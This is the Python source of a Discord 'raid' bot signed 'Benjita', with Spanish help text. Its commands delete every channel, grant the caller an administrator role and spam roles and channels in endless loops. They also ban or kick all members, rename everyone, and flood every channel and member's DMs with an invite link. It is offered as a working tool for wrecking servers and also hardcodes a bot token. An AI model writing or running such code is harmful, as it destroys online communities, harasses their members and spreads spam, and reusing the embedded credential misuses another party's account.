from discord import Permissions 
import discord,random,time
import json
from discord.ext import commands 
import os 
import colorama
import asyncio
from colorama import Fore
from discord import Embed 

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$",intents=intents)
bot.remove_command("help")
@bot.event
async def on_ready():
    print(colorama.Fore.BLUE + f'''
   ╭━━━━━━╮
╭┃    ╭━━━━╮
┃┃    ╰━━━━╯
┃┃ • Benjita bot •
╰┃┃ ─    ┌  ┃
 ╰━╯      ╰━╯


LOGIN BOT TY FOR USING H4Z RAID                   
''')

@bot.command()
async def nuke(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 1206717975474733156:
        await channel.delete()
      else:
        continue
    await ctx.guild.create_text_channel(name="fuked by Benjita")
    print("Nuked All Channels")
    return
  else:
    try:
      channel = ctx.get.channel(id=iny(channel_id))
      await channel.delete()
    except:
      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
      await ctx.send(embed=e2)
    return

@bot.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete() 
    try:
        guild = ctx.guild
        role = await guild.create_role(name=".", permissions=discord.Permissions(8),colour=discord.Colour(0x0EF5F6))
        authour = ctx.message.author
        await authour.add_roles(role)
        print("Gave you admin <3")
    except:
        print("Couldnt give you admin :(")

@bot.command()
async def createroles(ctx):
 while True:
   await ctx.guild.create_role(name="Benjita on top")
   print("Spamming roles <3")
@bot.command()
async def transrspam(ctx):
 while True:
   await ctx.guild.create_role(name="D̶e̶s̶t̶r̶o̶y̶e̶d̶ ̶b̶y̶ ̶Benjita",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="D̶e̶s̶t̶r̶o̶y̶e̶d̶ ̶b̶y̶ ̶Benjita",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="D̶e̶s̶t̶r̶o̶y̶e̶d̶ ̶b̶y̶ ̶Benjita",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_role(name="D̶e̶s̶t̶r̶o̶y̶e̶d̶ ̶b̶y̶ ̶Benjita",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="D̶e̶s̶t̶r̶o̶y̶e̶d̶ ̶b̶y̶ ̶Benjita ̶",colour=discord.Colour(0x0EF5F6))
   print("Spamming roles <3")
@bot.command()
async def deleteroles(ctx):
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass 
  embed = Embed(title="Todos los roles han sido elimanos", color=1)
  await ctx.send(embed=embed)
  await ctx.message.delete()


@bot.command()
async def createchannels(ctx,amount=100,name_of_channel="fuked by benjita"):
  await ctx.message.delete() 
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel)
  em3 = discord.Embed(title = f"Se han creado {amount} canales correctamente {name_of_channel}", color = 1)
  print(f"Spammed {amount} Channels <3")

  await ctx.send(embed=em3)

@bot.command()
async def vcchannels(ctx,amount=100,name_of_channel="fuked by benjita"): 
  await ctx.message.delete()
  for times in range(amount):
    await ctx.guild.create_voice_channel(name_of_channel)
  em3 = discord.Embed(title = f"Se han creado {amount} Canales correctamente {name_of_channel}", color = 1)
  print(f"Spammed {amount} Voice Channels <3")
  await ctx.send(embed=em3)

@bot.command()
async def banall(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"Banned {user}")
        except:
           pass
@bot.command()
async def kickall(ctx):
 await ctx.message.delete()
 #print("Kicked all members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(f"Kicked {user}")
        except:
           pass

@bot.command()
async def help(ctx):
 await ctx.message.delete()
 embed1 = Embed(title="‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎<:dea:1229193655638822912> ‎ ‎dosh bot commandos‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎", color=1)
 embed1.add_field(name="<a:satan:1229198763760025670> $nuke", value="Elimina todos los canales del servidor. ", inline=False)
 embed1.add_field(name="<a:satan:1229198763760025670> $createchannels <amount> <name>", value="Spamea una gran cantidad de canales", inline=True)
 embed1.add_field(name="<a:satan:1229198763760025670> $spam", value="Hace spam en todos los canales", inline=False)
 embed1.add_field(name="<a:satan:1229198763760025670> $createroles", value="Crea 200 roles", inline=False)
 embed1.add_field(name="<a:satan:1229198763760025670> $deleteroles", value="Elimina todos los roles del servidor", inline=False) 
 embed1.add_field(name="<a:satan:1229198763760025670> $admin", value="Crea un rol con admin y te lo sede", inline=False)
 embed1.add_field(name="<a:satan:1229198763760025670> vcchannels <Amount> <Channel Name>", value="Spamea canales de voz", inline=False)  
 embed1.add_field(name="<a:satan:1229198763760025670> $servername <Name>", value="Cambia el nombre del servidor", inline=False)
 embed1.add_field(name="<a:satan:1229198763760025670> $nickall <Name>", value="Cambia el nombre de todos los usuarios en el servidor", inline=False)
 embed1.add_field(name="<a:satan:1229198763760025670> $banall", value="Banea a todos los miembros del servidor", inline=False)
 embed1.add_field(name="<a:satan:1229198763760025670> $kickall", value="Expulsa a todos los miembros del servidor", inline=False)
 embed1.set_image(url="https://cdn.discordapp.com/banners/1206717975474733156/a_9ee56c88f9d8d3dd378b1afac61f0960.gif?size=1024")     
 embed1.set_footer(text="Benjita on top")
 await ctx.send(embed=embed1, delete_after=60)


# SPAMEAR TODOS LOS CANALES >pingspam
@bot.command()
async def ping(ctx):
    await ctx.guild.edit(name="fuked by Benjita")
    print("raped channels <3")
    latters = "Benjita"
    lattersL = latters.split()
    while True:
      for time in range(random.randint(4,10)):
        r1 = random.choice(lattersL)
      try:
        await guild.create_text_channel("hacked by benjita")
        await guild.create_voice_channel("raid by benjita")
      except:
        pass 
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='raid-by-benjita')
          await channel.send(f"@everyone **fuke by Benjita https://discord.gg/hxdShZ6A5t **")
          await ctx.channel.create_webhook(name="BenjitaOnTop")
          await channel.send(f"@everyone **fuke by Benjita https://discord.gg/hxdShZ6A5t **")
          await ctx.channel.create_webhook(name="BenjitaOnTop")
          await channel.send(f"@everyone **fuke by Benjita https://discord.gg/hxdShZ6A5t **")
          await ctx.channel.create_webhook(name="kizzygxng")
          await channel.send(f"@everyone **fuke by Benjita https://discord.gg/hxdShZ6A5t **")
          await ctx.channel.create_webhook(name="BenjitaOnTop")
          await channel.send(f"@everyone **fuke by Benjita https://discord.gg/hxdShZ6A5t **")
          await webhook.send()
        except:
          pass 
@bot.command()
async def spam(ctx):
  while True:
    for channel in ctx.guild.text_channels:
      await channel.send("@everyone **fuke by Benjita https://discord.gg/hxdShZ6A5t **")
      print("Lagging Channels")
      await channel.send("@everyone **fuke by Benjita https://discord.gg/hxdShZ6A5t **")
@bot.command()
async def servername(ctx, name = None): 
  if name != None:
    await ctx.guild.edit(name=f"{name}")
    print("Changed Server Name")
    em200 = Embed(color = 1, title=f"El nombre se ha cambiado correctamente a: ***{ctx.guild.name}***")
    await ctx.send(embed=em200, delete_after=8) 
  else:  
    em100 = Embed(color = 1, title=ctx.guild.name)
    em1001 = await ctx.send(embed=em100)
    time.sleep(8)
    await em1001.delete()
@bot.command()
async def nickall(ctx, *, name="fuked by Benjita"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 

@bot.command()
async def dmall(ctx):
    for member in ctx.guild.members:
        try:
            await asyncio.sleep(1)
            user_id = member.id  
            user = await bot.fetch_user(user_id)  
            asyncio.create_task(user.create_dm())  
            asyncio.create_task(user.send("El servidor en el que estás fue raideado por dosh https://discord.gg/hxdShZ6A5t"))
            print(f"Mensaje enviado a {user.name}")
        except:
            pass

@bot.event
async def on_member_join(member):
    await member.create_dm()
    await member.send("https://discord.gg/hxdShZ6A5t")
    print(f"Mensaje enviado a {member.name}")
    
@bot.command()
async def test(ctx):
    await ctx.guild.edit(name="Domados x Benjita")
    
    

bot.run("MTIzMTcwNzY5OTQ1Mjk3MzA1OA.Go1DPe.5JDzsyVkQOrH0R3viCyohHAuV9V-cmZ4nfleuU")
